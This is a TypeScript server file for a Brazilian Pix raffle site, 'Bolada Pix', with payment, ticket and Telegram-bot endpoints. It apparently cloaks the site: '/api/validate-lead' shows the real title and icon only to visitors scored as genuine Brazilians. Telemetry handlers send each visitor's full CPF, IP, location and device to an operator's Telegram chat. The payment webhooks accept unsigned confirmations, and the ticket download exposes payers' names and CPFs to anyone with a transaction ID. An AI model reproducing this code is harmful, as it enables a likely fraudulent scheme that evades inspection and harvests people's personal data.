import "./lib/error-capture";

import { consumeLastCapturedError } from "./lib/error-capture";
import { renderErrorPage } from "./lib/error-page";
import { getRifaConfig, logActivity, type ActivityEvent } from "./lib/rifa-store";
import { sendTelegramNotification, handleTelegramCommand, handleCallbackQuery } from "./lib/telegram-bot";
import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS } from "./lib/security-shield";
import { extractLeadProfile } from "./lib/lead-profiler";
import { PaymentManager, storeTransactionLead, getTransactionLead } from "./lib/payment-manager";
import { getSecret } from "./lib/vault-shield";
import { generateEncryptedTickets, formatTicketsAsTxt, type GeneratedTicket } from "./lib/ticket-generator";
import { decryptRouteParam } from "./lib/crypto-routes";

type ServerEntry = {
  fetch: (request: Request, env: unknown, ctx: unknown) => Promise<Response> | Response;
};

let serverEntryPromise: Promise<ServerEntry> | undefined;

async function getServerEntry(): Promise<ServerEntry> {
  if (!serverEntryPromise) {
    serverEntryPromise = import("@tanstack/react-start/server-entry").then(
      (m) => (m.default ?? m) as ServerEntry,
    );
  }
  return serverEntryPromise;
}

async function normalizeCatastrophicSsrResponse(response: Response): Promise<Response> {
  if (response.status < 500) return response;
  const contentType = response.headers.get("content-type") ?? "";
  if (!contentType.includes("application/json")) return response;

  const body = await response.clone().text();
  if (!isH3SwallowedErrorBody(body)) return response;

  console.error(consumeLastCapturedError() ?? new Error(`h3 swallowed SSR error: ${body}`));
  return new Response(renderErrorPage(), {
    status: 500,
    headers: { "content-type": "text/html; charset=utf-8", ...MILITARY_SECURITY_HEADERS },
  });
}

function isH3SwallowedErrorBody(body: string): boolean {
  try {
    const payload = JSON.parse(body) as { unhandled?: unknown; message?: unknown };
    return payload.unhandled === true && payload.message === "HTTPError";
  } catch {
    return false;
  }
}

export default {
  async fetch(request: Request, env: unknown, ctx: unknown) {
    const url = new URL(request.url);
    const clientIp = getClientIp(request);

    // 🛡️ 1. BLINDAGEM MILITAR: Verificação Anti-DDoS, Scanners de portas e Bloqueio Geográfico
    const securityCheck = auditSecurity(request);
    if (!securityCheck.allowed) {
      // Se for ataque/exploit/scan de portas, notifica o Admin Supremo com alerta de emergência
      if (securityCheck.isAttack) {
        const timeStr = new Date().toLocaleTimeString("pt-BR");
        await sendTelegramNotification(
          `🚨 <b>ALERTA DE SEGURANÇA MILITAR: TENTATIVA DE ATAQUE INTERCEPTADA!</b>\n` +
          `⚠️ <b>Tipo:</b> <code>${securityCheck.attackType || "Ataque Malicioso"}</code>\n` +
          `📍 <b>IP Infrator:</b> <code>${clientIp}</code> (Bloqueado)\n` +
          `🔍 <b>Detalhes:</b> <code>${securityCheck.details || "Inundação / Port Scan"}</code>\n` +
          `⏰ <b>Horário:</b> <code>${timeStr}</code>\n` +
          `🛡️ <i>O firewall militar descartou a conexão imediatamente.</i>`
        );
      }

      return new Response(JSON.stringify({ error: securityCheck.reason }), {
        status: 403,
        headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
      });
    }

    // 1.1 Endpoint de Validação Precisa de Lead Brasileiro Genuíno (descriptografa favicon e título na aprovação)
    if (url.pathname === "/api/validate-lead" && request.method === "POST") {
      const profile = extractLeadProfile(request, clientIp);
      const isGenuine = profile.validation.isGenuineBrazilian;

      return new Response(
        JSON.stringify({
          valid: isGenuine,
          score: profile.validation.score,
          city: profile.city,
          state: profile.state,
          country: profile.country,
          // Se validado, libera o payload descriptografado do título e do favicon
          title: isGenuine ? "Bolada Pix — Prêmios incríveis" : "Carregando...",
          icon: isGenuine ? "/assets/logo.webp" : "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>",
        }),
        {
          headers: {
            "Content-Type": "application/json",
            "Cache-Control": "no-store",
            ...MILITARY_SECURITY_HEADERS,
          },
        }
      );
    }

    // 1.2 Endpoint para consulta e verificação de bilhetes gerados
    if (url.pathname === "/api/tickets/status" && request.method === "GET") {
      const txId = url.searchParams.get("txId") || "";
      const leadRecord = getTransactionLead(txId);
      const tickets = (leadRecord?.lead as unknown as { tickets?: GeneratedTicket[] })?.tickets || [];

      return new Response(
        JSON.stringify({
          txId,
          hasTickets: tickets.length > 0,
          count: tickets.length,
          tickets: tickets.map((t) => ({ code: t.code, hash: t.hashToken })),
        }),
        {
          headers: {
            "Content-Type": "application/json",
            ...MILITARY_SECURITY_HEADERS,
          },
        }
      );
    }

    // 1.3 Endpoint para download dos bilhetes em arquivo .TXT oficial
    if (url.pathname === "/api/tickets/download" && request.method === "GET") {
      const txId = url.searchParams.get("txId") || "";
      const leadRecord = getTransactionLead(txId);
      const leadData = leadRecord?.lead as unknown as { tickets?: GeneratedTicket[]; name?: string; cpf?: string };
      const tickets = leadData?.tickets || [];
      const config = getRifaConfig();

      if (tickets.length === 0) {
        return new Response("Nenhum bilhete confirmado encontrado para esta transação.", {
          status: 404,
          headers: { "Content-Type": "text/plain; charset=utf-8" },
        });
      }

      const txtContent = formatTicketsAsTxt({
        edition: config.edition,
        txId,
        payerName: leadData?.name,
        payerDocument: leadData?.cpf,
        drawDate: `${config.drawDate} às ${config.drawTime}`,
        tickets,
      });

      return new Response(txtContent, {
        headers: {
          "Content-Type": "text/plain; charset=utf-8",
          "Content-Disposition": `attachment; filename="bolada_pix_bilhetes_${txId.substring(0, 10)}.txt"`,
          "Cache-Control": "no-store",
          ...MILITARY_SECURITY_HEADERS,
        },
      });
    }

    // 2. Endpoint para obter a configuração pública em tempo real da rifa e do WhatsApp
    if (url.pathname === "/api/rifa-config" && request.method === "GET") {
      const config = getRifaConfig();
      return new Response(JSON.stringify(config), {
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-store",
          ...MILITARY_SECURITY_HEADERS,
        },
      });
    }

    // Compatibilidade para endpoint direto de WhatsApp
    if (url.pathname === "/api/whatsapp-config" && request.method === "GET") {
      const config = getRifaConfig();
      return new Response(
        JSON.stringify({
          phone: config.whatsappSupportNumber,
          message: "Olá! Gostaria de informações sobre a Bolada Pix!",
        }),
        {
          headers: {
            "Content-Type": "application/json",
            "Cache-Control": "no-store",
            ...MILITARY_SECURITY_HEADERS,
          },
        }
      );
    }

    // 3. Endpoint de registro avançado de telemetria e perfil do lead
    if (url.pathname === "/api/activity-log" && request.method === "POST") {
      try {
        const body = (await request.json()) as Omit<ActivityEvent, "id" | "timestamp">;
        const profile = extractLeadProfile(request, clientIp);
        const dataPayload = body.data ?? undefined;

        const logged = logActivity({
          type: body.type,
          data: dataPayload,
          ip: clientIp,
          userAgent: profile.userAgent,
          state: profile.state,
          city: profile.city,
          device: `${profile.device} (${profile.os})`,
        });

        const dataObj = body.data || {};
        const cpfFull = typeof dataObj["cpf"] === "string" ? dataObj["cpf"] : (typeof dataObj["cpfLimpo"] === "string" ? dataObj["cpfLimpo"] : (typeof dataObj["cpfDigitado"] === "string" ? dataObj["cpfDigitado"] : "Não informado"));
        const timeStr = new Date().toLocaleTimeString("pt-BR");

        // Mensagens limpas, precisas e organizadas no Telegram
        if (body.type === "entrada") {
          await sendTelegramNotification(
            `🚪 <b>NOVO LEAD REAL NO SITE!</b>\n` +
            `📍 <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
            `📱 <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
            `🌐 <b>IP Completo:</b> <code>${clientIp}</code> | ⏰ <code>${timeStr}</code>`
          );
        } else if (body.type === "click_comprar") {
          const cotas = dataObj["cotas"] || 30;
          const valor = dataObj["valor"] || "20,70";
          const plano = dataObj["plano"] || `${cotas} números`;
          await sendTelegramNotification(
            `🛒 <b>CLIQUE EM COMPRAR!</b>\n` +
            `🎟 <b>Pacote Selecionado:</b> ${plano} (${cotas} cotas)\n` +
            `💰 <b>Valor Previsto:</b> R$ ${valor}\n` +
            `📍 <b>Origem:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
            `📱 <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "modal_opened") {
          await sendTelegramNotification(
            `📋 <b>LEAD ABRIU O MODAL DE DADOS</b>\n` +
            `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "cpf_validado") {
          await sendTelegramNotification(
            `✅ <b>CPF VALIDADO NO FORMULÁRIO</b>\n` +
            `👤 <b>CPF Completo:</b> <code>${cpfFull}</code>\n` +
            `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "cpf_invalido") {
          await sendTelegramNotification(
            `⚠️ <b>TENTATIVA DE CPF INVÁLIDO DIGITADO</b>\n` +
            `👤 <b>CPF Digitado:</b> <code>${cpfFull}</code>\n` +
            `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "clique_whatsapp") {
          const actionName = (dataObj["action"] as string) || "geral";
          const userMsg = (dataObj["message"] as string) || "Contato com suporte";
          await sendTelegramNotification(
            `📲 <b>LEAD DIRECIONADO AO WHATSAPP INTELIGENTE!</b>\n` +
            `🎯 <b>Ação Clicada:</b> <code>${actionName}</code>\n` +
            `💬 <b>Mensagem Contextual:</b> <i>"${userMsg}"</i>\n` +
            `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
            `📱 <b>Dispositivo:</b> ${profile.device} (${profile.os})\n` +
            `📞 <b>Número de Destino:</b> +${getRifaConfig().whatsappSupportNumber}\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "saida") {
          await sendTelegramNotification(
            `👋 <b>LEAD SAIU DO SITE</b>\n` +
            `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        }

        return new Response(JSON.stringify({ ok: true, id: logged.id }), {
          headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
        });
      } catch (err) {
        return new Response(JSON.stringify({ error: "Invalid payload" }), {
          status: 400,
          headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
        });
      }
    }

    // 4. Criação de Cobrança PIX com Failover Automático (União 7 Pay -> Elite PAYbr)
    if (url.pathname === "/api/create-pix" && request.method === "POST") {
      try {
        const payload = await request.json();
        const profile = extractLeadProfile(request, clientIp);

        const chargeResult = await PaymentManager.createPixCharge({
          amount: Number(payload.amount) || 20.70,
          description: payload.description || "Bolada Pix - Cota Oficial",
          payerName: payload.payerName,
          payerDocument: payload.payerDocument,
          externalId: `bolada_${Date.now()}`,
        });

        // Associa a transação aos dados reais e aprofundados do lead (100% explícito sem máscara)
        const digitsOnly = String(payload.payerDocument || "").replace(/\D/g, "");
        const formattedCpf = digitsOnly.length === 11 
          ? digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
          : (payload.payerDocument || "Não informado");

        storeTransactionLead(
          chargeResult.transactionId,
          {
            name: payload.payerName || "Participante Anônimo",
            cpf: formattedCpf,
            cpfMascarado: formattedCpf,
            ip: clientIp,
            state: profile.state,
            city: profile.city,
            device: profile.device,
            browser: profile.browser,
            os: profile.os,
          },
          chargeResult.amount,
          chargeResult.provider
        );

        logActivity({
          type: "compra_iniciada",
          data: {
            amount: payload.amount,
            provider: chargeResult.provider,
            txId: chargeResult.transactionId,
            fee: chargeResult.estimatedFee,
            netAmount: chargeResult.netAmount,
            cpf: formattedCpf,
          },
          ip: clientIp,
          state: profile.state,
          city: profile.city,
        });

        const timeStr = new Date().toLocaleTimeString("pt-BR");
        const dateStr = new Date().toLocaleDateString("pt-BR");

        await sendTelegramNotification(
          `💳 <b>NOVA COBRANÇA PIX GERADA!</b>\n\n` +
          `🏦 <b>API Emissora:</b> <code>${chargeResult.provider}</code>\n` +
          `💰 <b>Valor Bruto:</b> R$ ${chargeResult.amount.toFixed(2).replace(".", ",")}\n` +
          `📉 <b>Taxa Estimada da API:</b> R$ ${chargeResult.estimatedFee.toFixed(2).replace(".", ",")}\n` +
          `💵 <b>LÍQUIDO DO ADMIN SUPREMO:</b> <b>R$ ${chargeResult.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
          `👤 <b>DADOS DO LEAD (100% REAIS):</b>\n` +
          `• <b>CPF Completo:</b> <code>${formattedCpf}</code>\n` +
          `• <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
          `• <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
          `• <b>IP Completo:</b> <code>${clientIp}</code>\n` +
          `📅 <b>Data/Hora:</b> <code>${dateStr} às ${timeStr}</code>\n` +
          `🆔 <b>ID da Transação:</b> <code>${chargeResult.transactionId}</code>`
        );

        return new Response(JSON.stringify(chargeResult), {
          headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
        });
      } catch (err: unknown) {
        const errorMsg = err instanceof Error ? err.message : "Payment initiation error";
        console.error("[Create Pix Error]:", err);
        return new Response(JSON.stringify({ success: false, error: errorMsg }), {
          status: 500,
          headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
        });
      }
    }

    // 5. Webhooks de Pagamento (União 7 Pay e Elite PAYbr)
    if (url.pathname === "/api/webhook/uniao7" && request.method === "POST") {
      const body = await request.json();
      if (body.event === "payment.confirmed" || body.status === "paid") {
        const txId = body.transaction_id || "";
        const amount = Number(body.amount) || 0.69;
        const netCalc = PaymentManager.calculateNet(amount, "União 7 Pay");
        const leadRecord = getTransactionLead(txId);
        const lead = leadRecord?.lead;
        const config = getRifaConfig();

        // Quantidade de cotas compradas
        const unitPrice = config.ticketPrice || 0.69;
        const ticketQty = Math.max(1, Math.round(amount / unitPrice));

        // Geração dos códigos de 6 dígitos criptografados com CSPRNG e HMAC
        const tickets = generateEncryptedTickets(ticketQty, txId);
        if (lead) {
          (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
        }

        logActivity({
          type: "pagamento_confirmado",
          data: {
            amount: amount,
            netAmount: netCalc.netAmount,
            txId: txId,
            provider: "União 7 Pay",
            cpf: lead?.cpf,
            rifas: ticketQty,
            tickets: tickets.map((t) => t.code),
          },
          state: lead?.state || "SP",
          city: lead?.city || "São Paulo",
          ip: lead?.ip || clientIp,
        });

        const timeStr = new Date().toLocaleTimeString("pt-BR");
        const dateStr = new Date().toLocaleDateString("pt-BR");
        const ticketsSample = tickets.slice(0, 10).map((t) => `<code>${t.code}</code>`).join(", ") +
          (tickets.length > 10 ? ` <i>(+${tickets.length - 10} gerados)</i>` : "");

        await sendTelegramNotification(
          `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
          `🏦 <b>Gateway Responsável:</b> <code>União 7 Pay</code>\n` +
          `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
          `📉 <b>Taxa Descontada:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
          `💵 <b>VALOR LÍQUIDO DO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
          `🎟️ <b>COTAS GERADAS (6 DÍGITOS CRIPTOGRAFADOS):</b>\n` +
          `• <b>Quantidade:</b> ${tickets.length} cotas\n` +
          `• <b>Códigos:</b> ${ticketsSample}\n\n` +
          `👤 <b>RESUMO COMPLETO DO LEAD:</b>\n` +
          `• <b>Nome:</b> ${lead?.name || "Participante Bolada Pix"}\n` +
          `• <b>CPF Completo:</b> <code>${lead?.cpf || "Identificado no Checkout"}</code>\n` +
          `• <b>Localização:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
          `• <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
          `• <b>IP Completo:</b> <code>${lead?.ip || clientIp}</code>\n` +
          `📅 <b>Data e Hora da Aprovação:</b> <code>${dateStr} às ${timeStr}</code>\n` +
          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`,
          {
            replyMarkup: {
              inline_keyboard: [
                [{ text: `🚫 Banir este Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
                [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
              ],
            },
          }
        );
      }
      return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
    }

    if (url.pathname === "/api/webhook/elitepay" && request.method === "POST") {
      const body = await request.json();
      if (body.transactionState === "COMPLETO" || body.status === "concluido") {
        const txId = body.transactionId || "";
        const amount = Number(body.value) || 0.69;
        const netCalc = PaymentManager.calculateNet(amount, "Elite PAYbr");
        const leadRecord = getTransactionLead(txId);
        const lead = leadRecord?.lead;
        const config = getRifaConfig();

        const unitPrice = config.ticketPrice || 0.69;
        const ticketQty = Math.max(1, Math.round(amount / unitPrice));
        const tickets = generateEncryptedTickets(ticketQty, txId);
        if (lead) {
          (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
        }

        logActivity({
          type: "pagamento_confirmado",
          data: {
            amount: amount,
            netAmount: netCalc.netAmount,
            txId: txId,
            provider: "Elite PAYbr",
            cpf: lead?.cpf,
            rifas: ticketQty,
            tickets: tickets.map((t) => t.code),
          },
          state: lead?.state || "SP",
          city: lead?.city || "São Paulo",
          ip: lead?.ip || clientIp,
        });

        const timeStr = new Date().toLocaleTimeString("pt-BR");
        const dateStr = new Date().toLocaleDateString("pt-BR");
        const ticketsSample = tickets.slice(0, 10).map((t) => `<code>${t.code}</code>`).join(", ") +
          (tickets.length > 10 ? ` <i>(+${tickets.length - 10} gerados)</i>` : "");

        await sendTelegramNotification(
          `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
          `🏦 <b>Gateway Responsável:</b> <code>Elite PAYbr (Reserva)</code>\n` +
          `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
          `📉 <b>Taxa Descontada:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
          `💵 <b>VALOR LÍQUIDO DO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
          `🎟️ <b>COTAS GERADAS (6 DÍGITOS CRIPTOGRAFADOS):</b>\n` +
          `• <b>Quantidade:</b> ${tickets.length} cotas\n` +
          `• <b>Códigos:</b> ${ticketsSample}\n\n` +
          `👤 <b>RESUMO COMPLETO DO LEAD:</b>\n` +
          `• <b>Nome:</b> ${body.payerName || lead?.name || "Participante Bolada Pix"}\n` +
          `• <b>CPF Completo:</b> <code>${lead?.cpf || "Identificado no Checkout"}</code>\n` +
          `• <b>Localização:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
          `• <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
          `• <b>IP Completo:</b> <code>${lead?.ip || clientIp}</code>\n` +
          `📅 <b>Data e Hora da Aprovação:</b> <code>${dateStr} às ${timeStr}</code>\n` +
          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`,
          {
            replyMarkup: {
              inline_keyboard: [
                [{ text: `🚫 Banir este Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
                [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
              ],
            },
          }
        );
      }
      return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
    }

    // 6. Webhook do Bot Telegram com Suporte 100% a Botões e Ações
    if (url.pathname === "/api/telegram-webhook" && request.method === "POST") {
      try {
        const update = await request.json();
        const token = getSecret("TELEGRAM_BOT_TOKEN");

        // Processa clique em Botões Interativos (Callback Query)
        if (update.callback_query && token) {
          const cb = update.callback_query;
          const chatId = cb.message?.chat?.id;
          const messageId = cb.message?.message_id;
          const { reply, markup } = handleCallbackQuery(cb.data || "");

          // Responde o feedback do botão
          await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: cb.id }),
          });

          // Atualiza a mensagem na mesma tela sem spam
          if (chatId && messageId) {
            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: reply,
                parse_mode: "HTML",
                reply_markup: markup,
                disable_web_page_preview: true,
              }),
            });
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
        }

        const message = update?.message || update?.edited_message;
        if (message && message.text && token) {
          const { reply, markup } = handleTelegramCommand(message.text, message.message_id);
          const chatId = message.chat.id;

          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: reply,
              parse_mode: "HTML",
              reply_to_message_id: message.message_id,
              reply_markup: markup,
            }),
          });
        }
        return new Response(JSON.stringify({ ok: true }), {
          headers: { "Content-Type": "application/json" },
        });
      } catch (err) {
        return new Response(JSON.stringify({ ok: false }), { status: 500 });
      }
    }

    // 7. Renderização SSR protegida por cabeçalhos militares de segurança
    try {
      const handler = await getServerEntry();
      const response = await handler.fetch(request, env, ctx);
      const normalized = await normalizeCatastrophicSsrResponse(response);

      for (const [key, value] of Object.entries(MILITARY_SECURITY_HEADERS)) {
        normalized.headers.set(key, value);
      }
      return normalized;
    } catch (error) {
      console.error(error);
      return new Response(renderErrorPage(), {
        status: 500,
        headers: { "content-type": "text/html; charset=utf-8", ...MILITARY_SECURITY_HEADERS },
      });
    }
  },
};
